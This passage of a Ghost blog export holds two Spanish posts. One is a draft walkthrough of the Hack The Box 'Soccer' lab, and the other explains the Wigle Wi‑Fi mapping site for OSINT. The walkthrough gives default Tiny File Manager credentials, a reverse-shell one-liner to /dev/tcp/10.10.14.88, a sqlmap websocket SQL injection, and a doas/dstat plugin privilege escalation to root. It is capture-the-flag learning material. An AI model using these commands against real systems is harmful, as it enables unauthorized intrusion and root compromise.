            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image.png\",\"width\":410,\"height\":509,\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"Default username/password: **admin/admin@123** and **user/12345**.\"}],[\"bookmark\",{\"version\":\"1.0\",\"type\":\"bookmark\",\"url\":\"https://www.exploit-db.com/exploits/50828\",\"metadata\":{\"url\":\"https://www.exploit-db.com/exploits/50828\",\"title\":\"Tiny File Manager 2.4.6 - Remote Code Execution (RCE)\",\"description\":\"Tiny File Manager 2.4.6 - Remote Code Execution (RCE). CVE-2021-45010CVE-2021-40964 . webapps exploit for PHP platform\",\"author\":\"FEBIN MON SAJI\",\"publisher\":\"Exploit Database\",\"thumbnail\":\"https://www.exploit-db.com/images/spider-orange.png\",\"icon\":\"https://www.exploit-db.com/favicon.ico\"}}],[\"code\",{\"language\":\"bash\",\"code\":\"bash -c \\\"sh -i >& /dev/tcp/10.10.14.88/1111 0>&1\\\"\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-1.png\",\"width\":1263,\"height\":476}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-2.png\",\"width\":643,\"height\":128}],[\"code\",{\"language\":\"bash\",\"code\":\"find \\\\-perm -4000 2>/dev/null\"}],[\"code\",{\"language\":\"bash\",\"code\":\"player@soccer:/usr/local/bin$ ls -l\\n-rwsr-xr-x 1 root root 42224 Nov 17 09:09 doas\\n-rwxr-xr-x 1 root root  2002 Nov 17 09:09 doasedit\\n-rwxr-xr-x 1 root root  5471 Nov 17 09:09 vidoas\"}],[\"code\",{\"language\":\"bash\",\"code\":\"player@soccer:/usr/local/bin$ cat vidoas | grep conf\\n# Edit a temporary copy of the doas.conf file and check it for syntax\\n# errors before installing it as the actual doas.conf file.\\nDOAS_CONF=/usr/local/etc/doas.conf\\n...\"}],[\"code\",{\"language\":\"bash\",\"code\":\"player@soccer:/usr/local/bin$ cat /usr/local/etc/doas.conf\\npermit nopass player as root cmd /usr/bin/dstat\"}],[\"code\",{\"language\":\"bash\",\"code\":\"echo 'import os; os.system(\\\"bash -i\\\")' > dstat_privesc.py\"}],[\"code\",{\"language\":\"bash\",\"code\":\"doas -u root /usr/bin/dstat --privesc\\nroot@soccer:/usr/local/share/dstat# whoami\\n\\n# Output\\nroot\"}]],\"markups\":[[\"a\",[\"href\",\"https://github.com/prasathmani/tinyfilemanager\"]],[\"em\"],[\"strong\"],[\"a\",[\"href\",\"http://soc-player.soccer.htb\"]],[\"a\",[\"href\",\"https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Hacer nmap\"]]],[1,\"p\",[[0,[],0,\"Hacer wfuzz y encontrar /tiny\"]]],[10,0],[1,\"p\",[[0,[],0,\"Ir al repositorio \"],[0,[0],1,\"https://github.com/prasathmani/tinyfilemanager\"],[0,[],0,\" y encontrar el siguiente trozo de markdown.\"]]],[10,1],[1,\"p\",[[0,[],0,\"Probarlo y estar dentro.\"]]],[1,\"p\",[[0,[],0,\"Puedes subir archivos y ejecutar codigo remoto \"]]],[10,2],[1,\"p\",[[0,[],0,\"Puedo entrar a una shell con el siguiente comando \"]]],[10,3],[1,\"p\",[[0,[],0,\"Mirando en /etc/\"],[0,[1,2],2,\"nginx\"],[0,[],0,\"/\"],[0,[1,2],2,\"sites\"],[0,[],0,\"-\"],[0,[1,2],2,\"available\"],[0,[],0,\"/ vemos un subdominio: \"],[0,[3],1,\"http://soc-player.soccer.htb\"],[0,[],0,\". Es una web donde te puedes registrar y verificar tickets de futbol. \"]]],[10,4],[1,\"p\",[[0,[],0,\"La comunicación que hay por debajo es websocket. \"]]],[1,\"p\",[[0,[],0,\"Existe un script \"],[0,[4],1,\"https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html\"],[0,[],0,\" que levanta un servidor http, que utilizaremos de proxy con sqlmap para poder realizar sqli directamente.\"]]],[10,5],[1,\"p\",[[0,[],0,\"Entro por ssh, y busco archivos suid \"]]],[10,6],[1,\"p\",[[0,[],0,\"Encuentro doas\"]]],[10,7],[1,\"p\",[[0,[],0,\"El bit SUID activo.\"]]],[1,\"p\",[[0,[],0,\"Doas es un comando similar a sudo, capaz de ejecutar comandos desde otro usuario dependiendo su configuración. Su archivo de configuración por defecto está en /etc/doas.conf pero este no es el caso. Mirando el archivo vidoas, observamos los siguiente\"]]],[10,8],[1,\"p\",[[0,[],0,\"Haciendo un cat en esa ruta, vemos \"]]],[10,9],[1,\"p\",[[0,[],0,\"dstat es un comando para ver procesos del sistema. Leyendo MAN, vemos que tiene una carpeta de plugins /usr/local/share/dstat/\"]]],[1,\"p\",[[0,[],0,\"Creamos un plugin dentro del directorio. El plugin tiene que seguir la siguiente convención de nombres: dstat_<name>.py. Por lo que ejecutamos el siguiente comando:\"]]],[10,10],[1,\"p\",[[0,[],0,\"Ahora, debemos ejecutar dstat con ayuda de doas, siendo root y pasando el argumento necesario a dstat para que ejecute nuestro plugin. Como se denomina dstat_privesc, tenemos que ejecutar el siguiente comando\"]]],[10,11],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Hacer nmap</p><p>Hacer wfuzz y encontrar /tiny</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/12/image.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"410\" height=\"509\"></figure><p>Ir al repositorio <a href=\"https://github.com/prasathmani/tinyfilemanager\">https://github.com/prasathmani/tinyfilemanager</a> y encontrar el siguiente trozo de markdown.</p><!--kg-card-begin: markdown--><p>Default username/password: <strong>admin/admin@123</strong> and <strong>user/12345</strong>.</p>\n<!--kg-card-end: markdown--><p>Probarlo y estar dentro.</p><p>Puedes subir archivos y ejecutar codigo remoto </p><figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"https://www.exploit-db.com/exploits/50828\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">Tiny File Manager 2.4.6 - Remote Code Execution (RCE)</div><div class=\"kg-bookmark-description\">Tiny File Manager 2.4.6 - Remote Code Execution (RCE). CVE-2021-45010CVE-2021-40964 . webapps exploit for PHP platform</div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"https://www.exploit-db.com/favicon.ico\" alt=\"\"><span class=\"kg-bookmark-author\">Exploit Database</span><span class=\"kg-bookmark-publisher\">FEBIN MON SAJI</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"https://www.exploit-db.com/images/spider-orange.png\" alt=\"\"></div></a></figure><p>Puedo entrar a una shell con el siguiente comando </p><pre><code class=\"language-bash\">bash -c \"sh -i &gt;&amp; /dev/tcp/10.10.14.88/1111 0&gt;&amp;1\"</code></pre><p>Mirando en /etc/<em><strong>nginx</strong></em>/<em><strong>sites</strong></em>-<em><strong>available</strong></em>/ vemos un subdominio: <a href=\"http://soc-player.soccer.htb\">http://soc-player.soccer.htb</a>. Es una web donde te puedes registrar y verificar tickets de futbol. </p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/12/image-1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1263\" height=\"476\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/image-1.png 600w, __GHOST_URL__/content/images/size/w1000/2022/12/image-1.png 1000w, __GHOST_URL__/content/images/2022/12/image-1.png 1263w\" sizes=\"(min-width: 720px) 720px\"></figure><p>La comunicación que hay por debajo es websocket. </p><p>Existe un script <a href=\"https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html\">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a> que levanta un servidor http, que utilizaremos de proxy con sqlmap para poder realizar sqli directamente.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/12/image-2.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"643\" height=\"128\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/image-2.png 600w, __GHOST_URL__/content/images/2022/12/image-2.png 643w\"></figure><p>Entro por ssh, y busco archivos suid </p><pre><code class=\"language-bash\">find \\-perm -4000 2&gt;/dev/null</code></pre><p>Encuentro doas</p><pre><code class=\"language-bash\">player@soccer:/usr/local/bin$ ls -l\n-rwsr-xr-x 1 root root 42224 Nov 17 09:09 doas\n-rwxr-xr-x 1 root root  2002 Nov 17 09:09 doasedit\n-rwxr-xr-x 1 root root  5471 Nov 17 09:09 vidoas</code></pre><p>El bit SUID activo.</p><p>Doas es un comando similar a sudo, capaz de ejecutar comandos desde otro usuario dependiendo su configuración. Su archivo de configuración por defecto está en /etc/doas.conf pero este no es el caso. Mirando el archivo vidoas, observamos los siguiente</p><pre><code class=\"language-bash\">player@soccer:/usr/local/bin$ cat vidoas | grep conf\n# Edit a temporary copy of the doas.conf file and check it for syntax\n# errors before installing it as the actual doas.conf file.\nDOAS_CONF=/usr/local/etc/doas.conf\n...</code></pre><p>Haciendo un cat en esa ruta, vemos </p><pre><code class=\"language-bash\">player@soccer:/usr/local/bin$ cat /usr/local/etc/doas.conf\npermit nopass player as root cmd /usr/bin/dstat</code></pre><p>dstat es un comando para ver procesos del sistema. Leyendo MAN, vemos que tiene una carpeta de plugins /usr/local/share/dstat/</p><p>Creamos un plugin dentro del directorio. El plugin tiene que seguir la siguiente convención de nombres: dstat_&lt;name&gt;.py. Por lo que ejecutamos el siguiente comando:</p><pre><code class=\"language-bash\">echo 'import os; os.system(\"bash -i\")' &gt; dstat_privesc.py</code></pre><p>Ahora, debemos ejecutar dstat con ayuda de doas, siendo root y pasando el argumento necesario a dstat para que ejecute nuestro plugin. Como se denomina dstat_privesc, tenemos que ejecutar el siguiente comando</p><pre><code class=\"language-bash\">doas -u root /usr/bin/dstat --privesc\nroot@soccer:/usr/local/share/dstat# whoami\n\n# Output\nroot</code></pre>",
            "comment_id": "63ab7b885a13b30064643c43",
            "plaintext": "Hacer nmap\n\nHacer wfuzz y encontrar /tiny\n\nIr al repositorio https://github.com/prasathmani/tinyfilemanager y encontrar el siguiente trozo de markdown.\n\nDefault username/password: admin/admin@123 and user/12345.\n\n\nProbarlo y estar dentro.\n\nPuedes subir archivos y ejecutar codigo remoto\n\nTiny File Manager 2.4.6 - Remote Code Execution (RCE)Tiny File Manager 2.4.6 - Remote Code Execution (RCE). CVE-2021-45010CVE-2021-40964 . webapps exploit for PHP platformExploit DatabaseFEBIN MON SAJI\n\nPuedo entrar a una shell con el siguiente comando\n\nbash -c \"sh -i >& /dev/tcp/10.10.14.88/1111 0>&1\"\n\nMirando en /etc/nginx/sites-available/ vemos un subdominio: http://soc-player.soccer.htb. Es una web donde te puedes registrar y verificar tickets de futbol.\n\nLa comunicación que hay por debajo es websocket.\n\nExiste un script https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html que levanta un servidor http, que utilizaremos de proxy con sqlmap para poder realizar sqli directamente.\n\nEntro por ssh, y busco archivos suid\n\nfind \\-perm -4000 2>/dev/null\n\nEncuentro doas\n\nplayer@soccer:/usr/local/bin$ ls -l\n-rwsr-xr-x 1 root root 42224 Nov 17 09:09 doas\n-rwxr-xr-x 1 root root  2002 Nov 17 09:09 doasedit\n-rwxr-xr-x 1 root root  5471 Nov 17 09:09 vidoas\n\nEl bit SUID activo.\n\nDoas es un comando similar a sudo, capaz de ejecutar comandos desde otro usuario dependiendo su configuración. Su archivo de configuración por defecto está en /etc/doas.conf pero este no es el caso. Mirando el archivo vidoas, observamos los siguiente\n\nplayer@soccer:/usr/local/bin$ cat vidoas | grep conf\n# Edit a temporary copy of the doas.conf file and check it for syntax\n# errors before installing it as the actual doas.conf file.\nDOAS_CONF=/usr/local/etc/doas.conf\n...\n\nHaciendo un cat en esa ruta, vemos\n\nplayer@soccer:/usr/local/bin$ cat /usr/local/etc/doas.conf\npermit nopass player as root cmd /usr/bin/dstat\n\ndstat es un comando para ver procesos del sistema. Leyendo MAN, vemos que tiene una carpeta de plugins /usr/local/share/dstat/\n\nCreamos un plugin dentro del directorio. El plugin tiene que seguir la siguiente convención de nombres: dstat_<name>.py. Por lo que ejecutamos el siguiente comando:\n\necho 'import os; os.system(\"bash -i\")' > dstat_privesc.py\n\nAhora, debemos ejecutar dstat con ayuda de doas, siendo root y pasando el argumento necesario a dstat para que ejecute nuestro plugin. Como se denomina dstat_privesc, tenemos que ejecutar el siguiente comando\n\ndoas -u root /usr/bin/dstat --privesc\nroot@soccer:/usr/local/share/dstat# whoami\n\n# Output\nroot",
            "feature_image": "__GHOST_URL__/content/images/2022/12/Soccer.png",
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-12-27T23:11:04.000Z",
            "updated_at": "2022-12-30T23:24:57.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63ae0ba8010597005b7a2967",
            "uuid": "c42fdf0c-d2e5-4ff1-9287-2f0b63489b11",
            "title": "OSINT - Redes inalámbricas",
            "slug": "osint-redes-inalambricas",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-5.png\",\"width\":1155,\"height\":510,\"caption\":\"Imagen obtenida de https://wigle.net\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-4.png\",\"width\":1383,\"height\":513,\"caption\":\"Estadísticas de redes y su cifrado a lo largo del tiempo en <a href=\\\"https://wigle.net\\\">Wigle</a>\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/wi-fi-1.png\",\"width\":908,\"height\":561,\"caption\":\"Snapshot de mi red Wifi en Vitoria-Gasteiz\"}]],\"markups\":[[\"strong\"],[\"a\",[\"href\",\"https://letmegooglethat.com/?q=que+es+osint\"]],[\"a\",[\"href\",\"https://wigle.net\"]],[\"a\",[\"href\",\"https://www.xataka.com/seguridad/protocolo-seguridad-wpa3-para-redes-wifi-se-tambalea-tiene-grave-error-diseno\"]],[\"a\",[\"href\",\"https://wigle.net/faq\"]],[\"a\",[\"href\",\"https://www.elladodelmal.com/2020/05/como-evitar-que-google-utilice-tu-red.html\"]]],\"sections\":[[1,\"h2\",[[0,[],0,\"¿Que es OSINT?\"]]],[1,\"p\",[[0,[],0,\"OSINT (\"],[0,[0],1,\"O\"],[0,[],0,\"pen \"],[0,[0],1,\"S\"],[0,[],0,\"ource \"],[0,[0],1,\"INT\"],[0,[],0,\"elligence), o inteligencia de fuentes libres, hace referencia al conjunto de técnicas y herramientas para la obtención de información que muchas veces, sin saberlo, está de forma pública. Si queréis explicaciones más extensas y mejores, podéis ir directamente \"],[0,[1],1,\"aquí\"],[0,[],0,\". En este post, voy a ir al grano y es suficiente con saber que todas las empresas (y personas) somos susceptibles de tener información pública en internet. Sí, tú también.\"]]],[1,\"h2\",[[0,[],0,\"¿Quién utiliza OSINT?\"]]],[1,\"p\",[[0,[],0,\"Gobiernos, ejércitos, ciberdelincuentes, hackers, RRHH de esa empresa que te acaba de entrevistar para contratarte y tu amigo cuando quiere saber el Facebook o TikTok de esa chica que le gusta (guiño, guiño). Porque sí, mirar los amigos de los amigos de los amigos de una persona, también es OSINT. Pero en este post vamos a tratar de herramientas desconocidas para el común de los mortales y tratar de concienciarnos un poco de la importancia de la información.\"]]],[1,\"h2\",[[0,[],0,\"La herramienta de hoy... https://wigle.net\"]]],[1,\"p\",[[0,[2],1,\"Wigle\"],[0,[],0,\" (\"],[0,[0],1,\"Wi\"],[0,[],0,\"reless \"],[0,[0],1,\"G\"],[0,[],0,\"eographic \"],[0,[0],1,\"L\"],[0,[],0,\"ogging \"],[0,[0],1,\"E\"],[0,[],0,\"ngine), es un portal donde hay registrada la ubicación, además de otra información, de puntos de acceso inalámbricos a lo largo de todo el mundo. Esta información ha sido y es recopilada por voluntarios y posteriormente representada de una forma amigable a los usuarios como se puede ver en la imagen inferior.\"]]],[10,0],[1,\"p\",[[0,[],0,\"El método de uso de esta aplicación es la siguiente:\"]]],[3,\"ul\",[[[0,[],0,\"A partir de una ubicación dada, encontrar redes WiFi disponibles, así como su información (SSID, si está cifrada y su tipo de cifrado, lat. y lon., dirección MAC).\"]],[[0,[],0,\"Realizarlo de forma inversa, a partir de uno de estos datos, como el nombre de la red inalámbrica (SSID), ver si existe información disponible. Yo he hecho una prueba, pero esto te lo cuento al final.\"]]]],[1,\"p\",[[0,[0],1,\"Eso sí, necesitamos registrarnos gratuitamente para sacarle partido a la aplicación.\"]]],[1,\"p\",[[0,[],0,\"A continuación, te dejo unas estadísticas sobre esta herramienta a 29 de diciembre de 2022:\"]]],[3,\"ul\",[[[0,[],0,\"Hay 986.153.836 redes wifi.\"]],[[0,[],0,\"Hoy se han añadido 450.550.\"]],[[0,[],0,\"1,275,820,545 dispositivos bluetooth.\"]],[[0,[],0,\"18,463,291 torres de telefonía móvil.\"]]]],[10,1],[1,\"p\",[[0,[],0,\"Como se puede ver en la imagen superior, en 20 años, el número de redes inalámbricas sin cifrar, ha pasado de ser más del 60% a convertirse en algo residual a partir del año 2018. \"],[0,[0],1,\"Buenas noticias\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Por otro lado, a día de hoy, el número de redes que utilizan un cifrado WPA2 esta cerca del 72%. El cifrado WPA3 apenas llega al 1% de adopción. Esto no es raro teniendo en cuenta que este último cifrado nació prácticamente enfermo, como podemos leer en este \"],[0,[3],1,\"enlace\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Si queremos conocer un poco más la herramienta, en su apartado de \"],[0,[4],1,\"preguntas frecuentes\"],[0,[],0,\" podemos ver para que a que está destinado este proyecto.\"]]],[1,\"h2\",[[0,[],0,\"Prueba personal\"]]],[1,\"p\",[[0,[],0,\"Me he animado a tratar de localizar mi antigua vivienda a partir del nombre de la red y efectivamente, alguien pasó por mi casa con una de estas aplicaciones encargadas de recopilar información relativa a mi WiFi.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Seguro que algunos conocíais esta herramienta, pero apuesto a que la mayoría, no. Hace varios años escuché una charla de Chema Alonso (dejo un \"],[0,[5],1,\"link \"],[0,[],0,\"más reciente a su blog) hablando de cómo Google, basándose en la intensidad de la señal de las redes inalámbricas que detectaba en los móviles Android, era capaz de triangular la posición de una persona en el globo terráqueo. Es decir, no importa que desactivemos el GPS del móvil o que no le demos permisos a una aplicación de nuestra ubicación. Simplemente, si quieren saber donde estás, lo sabrán igual.\"]]],[1,\"p\",[[0,[],0,\"Espero escribir pronto sobre nuevas herramientas de OSINT. Creo que puede ser una tirada de posts chula e interesante para aquellos que me leáis.\"]]],[1,\"p\",[]],[1,\"blockquote\",[[0,[],0,\"“Conoce a tu enemigo y a ti mismo y en cien batallas nunca serás derrotado; Si eres ignorante de tu enemigo pero te conoces a ti mismo, las probabilidades de ganar o perder serán las mismas; si eres ignorante de tu enemigo y de ti mismo, saldrás derrotado siempre”. Sun Tzu, El arte de la Guerra.\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<h2 id=\"%C2%BFque-es-osint\">¿Que es OSINT?</h2><p>OSINT (<strong>O</strong>pen <strong>S</strong>ource <strong>INT</strong>elligence), o inteligencia de fuentes libres, hace referencia al conjunto de técnicas y herramientas para la obtención de información que muchas veces, sin saberlo, está de forma pública. Si queréis explicaciones más extensas y mejores, podéis ir directamente <a href=\"https://letmegooglethat.com/?q=que+es+osint\">aquí</a>. En este post, voy a ir al grano y es suficiente con saber que todas las empresas (y personas) somos susceptibles de tener información pública en internet. Sí, tú también.</p><h2 id=\"%C2%BFqui%C3%A9n-utiliza-osint\">¿Quién utiliza OSINT?</h2><p>Gobiernos, ejércitos, ciberdelincuentes, hackers, RRHH de esa empresa que te acaba de entrevistar para contratarte y tu amigo cuando quiere saber el Facebook o TikTok de esa chica que le gusta (guiño, guiño). Porque sí, mirar los amigos de los amigos de los amigos de una persona, también es OSINT. Pero en este post vamos a tratar de herramientas desconocidas para el común de los mortales y tratar de concienciarnos un poco de la importancia de la información.</p><h2 id=\"la-herramienta-de-hoy-httpswiglenet\">La herramienta de hoy... https://wigle.net</h2><p><a href=\"https://wigle.net\">Wigle</a> (<strong>Wi</strong>reless <strong>G</strong>eographic <strong>L</strong>ogging <strong>E</strong>ngine), es un portal donde hay registrada la ubicación, además de otra información, de puntos de acceso inalámbricos a lo largo de todo el mundo. Esta información ha sido y es recopilada por voluntarios y posteriormente representada de una forma amigable a los usuarios como se puede ver en la imagen inferior.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/image-5.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1155\" height=\"510\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/image-5.png 600w, __GHOST_URL__/content/images/size/w1000/2022/12/image-5.png 1000w, __GHOST_URL__/content/images/2022/12/image-5.png 1155w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Imagen obtenida de https://wigle.net</figcaption></figure><p>El método de uso de esta aplicación es la siguiente:</p><ul><li>A partir de una ubicación dada, encontrar redes WiFi disponibles, así como su información (SSID, si está cifrada y su tipo de cifrado, lat. y lon., dirección MAC).</li><li>Realizarlo de forma inversa, a partir de uno de estos datos, como el nombre de la red inalámbrica (SSID), ver si existe información disponible. Yo he hecho una prueba, pero esto te lo cuento al final.</li></ul><p><strong>Eso sí, necesitamos registrarnos gratuitamente para sacarle partido a la aplicación.</strong></p><p>A continuación, te dejo unas estadísticas sobre esta herramienta a 29 de diciembre de 2022:</p><ul><li>Hay 986.153.836 redes wifi.</li><li>Hoy se han añadido 450.550.</li><li>1,275,820,545 dispositivos bluetooth.</li><li>18,463,291 torres de telefonía móvil.</li></ul><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/image-4.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1383\" height=\"513\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/image-4.png 600w, __GHOST_URL__/content/images/size/w1000/2022/12/image-4.png 1000w, __GHOST_URL__/content/images/2022/12/image-4.png 1383w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Estadísticas de redes y su cifrado a lo largo del tiempo en <a href=\"https://wigle.net\">Wigle</a></figcaption></figure><p>Como se puede ver en la imagen superior, en 20 años, el número de redes inalámbricas sin cifrar, ha pasado de ser más del 60% a convertirse en algo residual a partir del año 2018. <strong>Buenas noticias</strong>.</p><p>Por otro lado, a día de hoy, el número de redes que utilizan un cifrado WPA2 esta cerca del 72%. El cifrado WPA3 apenas llega al 1% de adopción. Esto no es raro teniendo en cuenta que este último cifrado nació prácticamente enfermo, como podemos leer en este <a href=\"https://www.xataka.com/seguridad/protocolo-seguridad-wpa3-para-redes-wifi-se-tambalea-tiene-grave-error-diseno\">enlace</a>.</p><p>Si queremos conocer un poco más la herramienta, en su apartado de <a href=\"https://wigle.net/faq\">preguntas frecuentes</a> podemos ver para que a que está destinado este proyecto.</p><h2 id=\"prueba-personal\">Prueba personal</h2><p>Me he animado a tratar de localizar mi antigua vivienda a partir del nombre de la red y efectivamente, alguien pasó por mi casa con una de estas aplicaciones encargadas de recopilar información relativa a mi WiFi.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/wi-fi-1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"908\" height=\"561\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/wi-fi-1.png 600w, __GHOST_URL__/content/images/2022/12/wi-fi-1.png 908w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Snapshot de mi red Wifi en Vitoria-Gasteiz</figcaption></figure><p>Seguro que algunos conocíais esta herramienta, pero apuesto a que la mayoría, no. Hace varios años escuché una charla de Chema Alonso (dejo un <a href=\"https://www.elladodelmal.com/2020/05/como-evitar-que-google-utilice-tu-red.html\">link </a>más reciente a su blog) hablando de cómo Google, basándose en la intensidad de la señal de las redes inalámbricas que detectaba en los móviles Android, era capaz de triangular la posición de una persona en el globo terráqueo. Es decir, no importa que desactivemos el GPS del móvil o que no le demos permisos a una aplicación de nuestra ubicación. Simplemente, si quieren saber donde estás, lo sabrán igual.</p><p>Espero escribir pronto sobre nuevas herramientas de OSINT. Creo que puede ser una tirada de posts chula e interesante para aquellos que me leáis.</p><p></p><blockquote>“Conoce a tu enemigo y a ti mismo y en cien batallas nunca serás derrotado; Si eres ignorante de tu enemigo pero te conoces a ti mismo, las probabilidades de ganar o perder serán las mismas; si eres ignorante de tu enemigo y de ti mismo, saldrás derrotado siempre”. Sun Tzu, El arte de la Guerra.</blockquote>",
            "comment_id": "63ae0ba8010597005b7a2967",
            "plaintext": "¿Que es OSINT?\n\nOSINT (Open Source INTelligence), o inteligencia de fuentes libres, hace referencia al conjunto de técnicas y herramientas para la obtención de información que muchas veces, sin saberlo, está de forma pública. Si queréis explicaciones más extensas y mejores, podéis ir directamente aquí. En este post, voy a ir al grano y es suficiente con saber que todas las empresas (y personas) somos susceptibles de tener información pública en internet. Sí, tú también.\n\n\n¿Quién utiliza OSINT?\n\nGobiernos, ejércitos, ciberdelincuentes, hackers, RRHH de esa empresa que te acaba de entrevistar para contratarte y tu amigo cuando quiere saber el Facebook o TikTok de esa chica que le gusta (guiño, guiño). Porque sí, mirar los amigos de los amigos de los amigos de una persona, también es OSINT. Pero en este post vamos a tratar de herramientas desconocidas para el común de los mortales y tratar de concienciarnos un poco de la importancia de la información.\n\n\nLa herramienta de hoy... https://wigle.net\n\nWigle (Wireless Geographic Logging Engine), es un portal donde hay registrada la ubicación, además de otra información, de puntos de acceso inalámbricos a lo largo de todo el mundo. Esta información ha sido y es recopilada por voluntarios y posteriormente representada de una forma amigable a los usuarios como se puede ver en la imagen inferior.\n\nEl método de uso de esta aplicación es la siguiente:\n\n * A partir de una ubicación dada, encontrar redes WiFi disponibles, así como su información (SSID, si está cifrada y su tipo de cifrado, lat. y lon., dirección MAC).\n * Realizarlo de forma inversa, a partir de uno de estos datos, como el nombre de la red inalámbrica (SSID), ver si existe información disponible. Yo he hecho una prueba, pero esto te lo cuento al final.\n\nEso sí, necesitamos registrarnos gratuitamente para sacarle partido a la aplicación.\n\nA continuación, te dejo unas estadísticas sobre esta herramienta a 29 de diciembre de 2022:\n\n * Hay 986.153.836 redes wifi.\n * Hoy se han añadido 450.550.\n * 1,275,820,545 dispositivos bluetooth.\n * 18,463,291 torres de telefonía móvil.\n\nComo se puede ver en la imagen superior, en 20 años, el número de redes inalámbricas sin cifrar, ha pasado de ser más del 60% a convertirse en algo residual a partir del año 2018. Buenas noticias.\n\nPor otro lado, a día de hoy, el número de redes que utilizan un cifrado WPA2 esta cerca del 72%. El cifrado WPA3 apenas llega al 1% de adopción. Esto no es raro teniendo en cuenta que este último cifrado nació prácticamente enfermo, como podemos leer en este enlace.\n\nSi queremos conocer un poco más la herramienta, en su apartado de preguntas frecuentes podemos ver para que a que está destinado este proyecto.\n\n\nPrueba personal\n\nMe he animado a tratar de localizar mi antigua vivienda a partir del nombre de la red y efectivamente, alguien pasó por mi casa con una de estas aplicaciones encargadas de recopilar información relativa a mi WiFi.\n\nSeguro que algunos conocíais esta herramienta, pero apuesto a que la mayoría, no. Hace varios años escuché una charla de Chema Alonso (dejo un link más reciente a su blog) hablando de cómo Google, basándose en la intensidad de la señal de las redes inalámbricas que detectaba en los móviles Android, era capaz de triangular la posición de una persona en el globo terráqueo. Es decir, no importa que desactivemos el GPS del móvil o que no le demos permisos a una aplicación de nuestra ubicación. Simplemente, si quieren saber donde estás, lo sabrán igual.\n\nEspero escribir pronto sobre nuevas herramientas de OSINT. Creo que puede ser una tirada de posts chula e interesante para aquellos que me leáis.\n\n\n\n“Conoce a tu enemigo y a ti mismo y en cien batallas nunca serás derrotado; Si eres ignorante de tu enemigo pero te conoces a ti mismo, las probabilidades de ganar o perder serán las mismas; si eres ignorante de tu enemigo y de ti mismo, saldrás derrotado siempre”. Sun Tzu, El arte de la Guerra.",
            "feature_image": "__GHOST_URL__/content/images/2022/12/osint.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-12-29T21:50:32.000Z",
            "updated_at": "2022-12-29T23:20:18.000Z",
            "published_at": "2022-12-29T23:16:43.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63af2f59fef629005bc8cf00",
            "uuid": "6c9055d7-438b-461b-9010-e73e03a773a1",
            "title": "CTF - Mentor WriteUp",
            "slug": "ctf-mentor",
